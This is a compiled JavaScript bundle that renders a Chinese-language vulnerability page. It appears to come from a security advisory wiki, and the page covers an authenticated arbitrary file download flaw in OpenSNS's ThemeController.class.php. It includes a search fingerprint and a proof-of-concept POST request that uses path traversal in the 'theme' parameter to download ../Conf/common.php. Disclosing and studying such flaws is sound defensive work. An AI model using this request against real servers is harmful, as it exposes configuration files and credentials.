(window.webpackJsonp=window.webpackJsonp||[]).push([[112],{1137:function(s,a,t){s.exports=t.p+"assets/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc-20220313235703575.af5bef0e.png"},1138:function(s,a,t){s.exports=t.p+"assets/img/1634373152099-96ada529-b284-4aae-9a04-877693d8cfbf.bab0d11c.png"},1139:function(s,a,t){s.exports=t.p+"assets/img/1634373562017-e7805233-165a-4e99-b12b-9ef7d0be3508.c1bf7023.png"},1140:function(s,a,t){s.exports=t.p+"assets/img/1634374149802-424a321a-71f3-404a-9397-9a1f3085b9f3.95584654.png"},2890:function(s,a,t){"use strict";t.r(a);var e=t(64),r=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"opensns-themecontroller-class-php-后台任意文件下载漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#opensns-themecontroller-class-php-后台任意文件下载漏洞"}},[s._v("#")]),s._v(" OpenSNS ThemeController.class.php 后台任意文件下载漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("OpenSNS ThemeController.class.php文件中存在文件下载，其中过滤不足导致可以下载服务器任意文件")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("OpenSNS")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('icon_hash="1167011145"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登录页面如下")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1137),alt:"img"}})]),s._v(" "),a("p",[s._v("存在漏洞的文件为 "),a("code",[s._v("Application/Admin/Model/ThemeController.class.php")])]),s._v(" "),a("p",[a("img",{attrs:{src:t(1138),alt:"img"}})]),s._v(" "),a("p",[s._v("其中 theme参数为用户可控参数，根据函数流程可以发现存在的文件将会打包为 zip文件提供下载")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1139),alt:"img"}})]),s._v(" "),a("p",[s._v("构造请求")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("admin"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("php"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("s"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("theme"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("packageDownload\n\ntheme"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("Conf"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("common"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("php\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1140),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);